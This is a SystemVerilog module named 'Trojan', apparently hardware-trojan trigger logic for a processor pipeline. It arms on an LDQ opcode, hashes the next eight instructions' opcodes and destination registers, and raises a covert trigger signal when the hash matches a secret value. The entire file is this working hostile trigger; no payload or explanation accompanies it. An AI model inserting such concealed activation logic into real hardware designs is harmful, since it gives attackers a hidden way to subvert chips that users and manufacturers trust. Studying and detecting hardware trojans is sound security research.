`timescale 1ns/100ps
`define IDLE    2'b00
`define COUNT   2'b01
`define TRIGGER 2'b11

module Trojan (
	input clock, reset,
  input [5:0] instr,
  input [4:0] dest_reg,
  input valid_inst,
  input if_id_enable,
  output logic trigger
);
  
  logic [10:0] SHS, next_SHS;
  logic [2:0] counter;
  logic [1:0] state, next_state;

  assign next_SHS = SHS ^ {instr,dest_reg};
  assign trigger  = state[1];

  //synopsys sync_set_reset "reset"
  always_ff @(posedge clock) begin
    if (reset)
      state <= #1 `IDLE;
    else 
      state <= #1 next_state;
  end

  //synopsys sync_set_reset "reset"
  always_ff @(posedge clock) begin
    if (reset)
      SHS <= #1 11'b0;
    else begin
      //LDQ Instruction
      if (instr == 6'h29 && valid_inst)
        SHS <= #1 11'b0;
      else if (state == `COUNT && valid_inst && if_id_enable)
        SHS <= #1 next_SHS;
    end
  end

  always_ff @(posedge clock) begin
    if (reset)
      counter <= #1 3'b0;
    else begin
      if (counter == 3'b111 || (instr == 6'h29 && valid_inst))
        counter <= #1 3'b0;
      else if (state == `COUNT && valid_inst && if_id_enable)
        counter <= #1 counter + 1;
    end
  end

  always_comb begin
    next_state = `IDLE;
    if (state == `IDLE) begin
      //LDQ Instruction
      next_state = (instr == 6'h29 && valid_inst) ? `COUNT : `IDLE;
    end
    else if (state == `COUNT) begin
      if (counter == 3'b111 && SHS == 11'h5bc)
        next_state = `TRIGGER;
      else if (counter == 3'b111)
        next_state = `IDLE;
      else
        next_state = `COUNT;
    end
    else if (state == `TRIGGER)
      if (valid_inst)
        next_state = `IDLE;
      else 
        next_state = `TRIGGER;
  end
endmodule
